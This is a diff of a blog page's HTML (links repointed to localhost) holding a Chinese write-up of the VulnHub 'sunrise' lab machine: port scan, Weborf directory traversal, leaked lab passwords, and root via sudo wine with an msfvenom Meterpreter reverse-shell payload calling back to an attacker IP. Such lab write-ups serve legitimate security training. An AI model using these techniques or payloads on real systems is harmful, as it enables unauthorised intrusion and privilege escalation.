@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title> [vulnhub]sunrise靶机 | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title=" [vulnhub]sunrise靶机 | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title=" [vulnhub]sunrise靶机 | 过客 » Feed" href="http://localhost:4000/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content=" [vulnhub]sunrise靶机"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/vulnhubsunrise-ba-ji/"/>
+    <meta property="og:url" content="http://localhost:4000/post/vulnhubsunrise-ba-ji/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content="过客"/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="https://guokeya.github.io">过客</a>
+      <a class="navbar-brand" href="http://localhost:4000">过客</a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,7 +80,7 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="https://guokeya.github.io/tag/EfzSPkBWE/" class="tag">渗透测试</a>
+            <a href="http://localhost:4000/tag/EfzSPkBWE/" class="tag">渗透测试</a>
             
         </span>
             <h1> [vulnhub]sunrise靶机</h1>
@@ -100,7 +100,7 @@
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <p>开放端口22/80/3306/8080<br>
-<img src="https://guokeya.github.io/post-images/1580896853991.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1580896853991.png" alt="" loading="lazy"></p>
 <!-- more -->
 <pre><code>22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
 80/tcp   open  http       Apache httpd 2.4.38
@@ -108,38 +108,38 @@
 8080/tcp open  http-proxy Weborf (GNU/Linux)
 </code></pre>
 <p>80端口啥也没有。看下8080weborf有没有什么漏洞<br>
-<img src="https://guokeya.github.io/post-images/1580897081350.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580897081350.png" alt="" loading="lazy"><br>
 看下目录穿越漏洞<br>
 存在weborf和sunrise用户。<br>
-<img src="https://guokeya.github.io/post-images/1580897146142.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580897146142.png" alt="" loading="lazy"><br>
 翻了下没什么东西。<br>
-<img src="https://guokeya.github.io/post-images/1580897211833.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580897211833.png" alt="" loading="lazy"><br>
 干脆用dirb扫。主要扫用户目录下的隐藏文件。<br>
-<img src="https://guokeya.github.io/post-images/1580897292466.png" alt="" loading="lazy"><br>
-<img src="https://guokeya.github.io/post-images/1580897325793.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580897292466.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580897325793.png" alt="" loading="lazy"><br>
 得到密码。weborf:iheartrainbows44<br>
 mysql登不上应该只能本地登陆。尝试ssh。成功登陆<br>
 继续信息搜集。内核版本。web目录。suid提权。sudo。都没什么好东西<br>
 之前的mysql是因为host不被允许而禁止登陆。并不是密码错误。<br>
 这时候本地登陆下试试，成功。并在user表中。发现一个特殊的密码。<br>
-<img src="https://guokeya.github.io/post-images/1580897520524.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580897520524.png" alt="" loading="lazy"><br>
 猜测这就是sunrise用户的明文。<br>
 果然如此。登陆上了<br>
-<img src="https://guokeya.github.io/post-images/1580897563187.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580897563187.png" alt="" loading="lazy"><br>
 可以root权限执行wine。wine用于Linux执行windows下的exe<br>
 用msf生成个exe后门。sudo wine执行。就会返回root权限的shell</p>
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp -f exe  LHOST=192.168.0.185 LPORT=6666 -o payload.exe
 scp payload.exe sunrise@192.168.0.184:/tmp
 </code></pre>
 <p>msf配置如下<br>
-<img src="https://guokeya.github.io/post-images/1580897688300.png" alt="" loading="lazy"><br>
+<img src="http://localhost:4000/post-images/1580897688300.png" alt="" loading="lazy"><br>
 kali：exploit<br>
 靶机：sudo wine payload.exe<br>
-<img src="https://guokeya.github.io/post-images/1580897893686.png" alt="" loading="lazy"></p>
+<img src="http://localhost:4000/post-images/1580897893686.png" alt="" loading="lazy"></p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/vulnhubfive86-2-ba-ji/">
+            <a href="http://localhost:4000/post/vulnhubfive86-2-ba-ji/">
               <span class="post-title">
                 [vulnhub]Five86-2靶机&rarr;
               </span>
@@ -174,7 +174,7 @@ kali：exploit<br>
             
               
               <li class="list-inline-item">
-              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+              <a href="http://localhost:4000/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -189,10 +189,10 @@ kali：exploit<br>
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
